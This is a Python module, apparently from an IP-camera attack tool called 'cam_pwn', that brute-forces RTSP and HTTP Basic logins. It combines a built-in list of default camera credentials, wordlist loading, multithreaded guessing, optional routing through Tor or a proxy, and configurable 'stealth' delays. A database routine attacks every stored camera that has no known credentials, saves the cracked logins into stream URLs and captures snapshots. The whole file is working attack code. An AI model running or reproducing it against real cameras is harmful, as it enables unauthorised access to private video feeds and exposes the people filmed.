"""
RTSP/HTTP brute-force module with wordlists (RockYou, default creds), multi-threading, optional Tor/proxy.
Uses stealth.delay_ms from config for rate limiting.
"""

import logging
import queue
import threading
import time
from pathlib import Path
from typing import Callable, List, Optional, Tuple

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from cam_pwn.config import get
from cam_pwn.db.models import Camera, get_session, init_db, ScanResult

logger = logging.getLogger(__name__)

# Default credentials for IP cameras (user, pass)
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "password"),
    ("admin", ""),
    ("root", "root"),
    ("root", "toor"),
    ("service", "service"),
    ("user", "user"),
    ("admin", "1234"),
    ("admin", "4321"),
    ("admin", "123456"),
    ("admin", "666666"),
    ("admin", "888888"),
    ("admin", "admin123"),
    ("supervisor", "supervisor"),
    ("default", "default"),
    ("guest", "guest"),
    ("support", "support"),
    ("tech", "tech"),
    ("Administrator", "admin"),
]


def _load_wordlist(path: str) -> List[Tuple[str, str]]:
    """Load user:pass or pass-only wordlist. Returns list of (user, pass)."""
    out = []
    p = Path(path)
    if not p.exists():
        return []
    try:
        with open(p, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    u, _, pwd = line.partition(":")
                    out.append((u.strip(), pwd.strip()))
                else:
                    out.append(("admin", line))
    except Exception as e:
        logger.warning("Wordlist %s load error: %s", path, e)
    return out


def _probe_rtsp(ip: str, port: int, user: str, password: str, timeout: float) -> bool:
    """Probe RTSP with OPTIONS or DESCRIBE (no external rtsp lib required)."""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        # RTSP DESCRIBE with Basic auth
        import base64
        cred = base64.b64encode(f"{user}:{password}".encode()).decode()
        req = (
            f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
            f"Authorization: Basic {cred}\r\n"
            f"CSeq: 1\r\n\r\n"
        )
        s.send(req.encode())
        data = s.recv(4096).decode("utf-8", errors="ignore")
        s.close()
        if "200 OK" in data or "401" not in data:
            return "200 OK" in data
    except Exception:
        pass
    return False


def _probe_http_basic(ip: str, port: int, user: str, password: str, path: str, timeout: float, use_ssl: bool) -> bool:
    """Probe HTTP Basic auth on common camera paths."""
    base = f"{'https' if use_ssl else 'http'}://{ip}:{port}"
    url = f"{base}{path}"
    try:
        r = requests.get(url, auth=(user, password), timeout=timeout)
        return r.status_code == 200
    except Exception:
        return False


def rtsp_bruteforce(
    ip: str,
    port: int = 554,
    credentials: Optional[List[Tuple[str, str]]] = None,
    wordlist_path: Optional[str] = None,
    timeout: float = 5,
    num_threads: int = 8,
    proxy: Optional[str] = None,
) -> Optional[Tuple[str, str]]:
    """
    Brute-force RTSP. Returns (user, pass) if found, else None.
    proxy: e.g. socks5://127.0.0.1:9050 for Tor.
    """
    creds = list(credentials or DEFAULT_CREDENTIALS)
    if wordlist_path:
        creds.extend(_load_wordlist(wordlist_path))
    if not creds:
        return None
    timeout = timeout or get("bruteforce.timeout", 5)
    num_threads = min(num_threads or get("bruteforce.threads", 8), len(creds))
    result = [None]  # mutable to store first valid
    lock = threading.Lock()

    def worker():
        while True:
            try:
                user, pwd = q.get_nowait()
            except queue.Empty:
                break
            if result[0] is not None:
                q.task_done()
                continue
            if _probe_rtsp(ip, port, user, pwd, timeout):
                with lock:
                    if result[0] is None:
                        result[0] = (user, pwd)
            q.task_done()

    q = queue.Queue()
    for c in creds:
        q.put(c)
    threads = [threading.Thread(target=worker) for _ in range(num_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return result[0]


def http_bruteforce(
    ip: str,
    port: int = 80,
    paths: Optional[List[str]] = None,
    credentials: Optional[List[Tuple[str, str]]] = None,
    wordlist_path: Optional[str] = None,
    timeout: float = 5,
    num_threads: int = 8,
) -> Optional[Tuple[str, str]]:
    """Brute-force HTTP Basic on camera paths. Returns (user, pass) if found."""
    paths = paths or ["/", "/admin", "/video", "/snapshot.jpg", "/cgi-bin/snapshot.cgi"]
    creds = list(credentials or DEFAULT_CREDENTIALS)
    if wordlist_path:
        creds.extend(_load_wordlist(wordlist_path))
    for path in paths:
        for user, pwd in creds:
            if _probe_http_basic(ip, port, user, pwd, path, timeout, use_ssl=(port == 443)):
                return (user, pwd)
    return None


def run_rtsp_bruteforce_on_db(
    camera_ids: Optional[List[int]] = None,
    wordlist_path: Optional[str] = None,
    project: Optional[str] = None,
) -> int:
    """Run RTSP brute on cameras in DB. Filter: RTSP port + no existing creds. project filters by Camera.project."""
    from cam_pwn.db.models import Camera as _Cam
    if wordlist_path is None:
        from cam_pwn.kali_paths import get_wordlist_path
        wordlist_path = get_wordlist_path()
    init_db()
    session = get_session()
    # Only cameras with RTSP port and without existing credentials
    q = session.query(Camera).filter(
        Camera.rtsp_port.isnot(None),
        (Camera.credentials.is_(None)) | (Camera.credentials == ""),
    )
    if camera_ids:
        q = q.filter(Camera.id.in_(camera_ids))
    if project is not None:
        q = q.filter(Camera.project == project)
    cams = list(q)
    count = 0
    from cam_pwn.screenshots import capture_snapshot
    try:
        try:
            from tqdm import tqdm
            cam_iter = tqdm(cams, desc="Brute", unit="cam")
        except ImportError:
            cam_iter = cams
        delay_ms = get("stealth.delay_ms", 0) or 0
        for cam in cam_iter:
            cred = rtsp_bruteforce(cam.ip, cam.rtsp_port or 554, wordlist_path=wordlist_path)
            if delay_ms > 0:
                time.sleep(delay_ms / 1000.0)
            if cred:
                user, pwd = cred
                cam.credentials = __import__("json").dumps({"user": user, "pass": pwd})
                cam.rtsp_url = f"rtsp://{user}:{pwd}@{cam.ip}:{cam.rtsp_port or 554}/"
                session.add(ScanResult(camera_id=cam.id, scan_type="rtsp_brute", result=f'{{"user":"{user}"}}', success=True))
                # Optional: best-effort snapshot capture
                capture_snapshot(cam)
                count += 1
        session.commit()
    except Exception as e:
        session.rollback()
        logger.exception("run_rtsp_bruteforce_on_db: %s", e)
        raise
    finally:
        session.close()
    return count
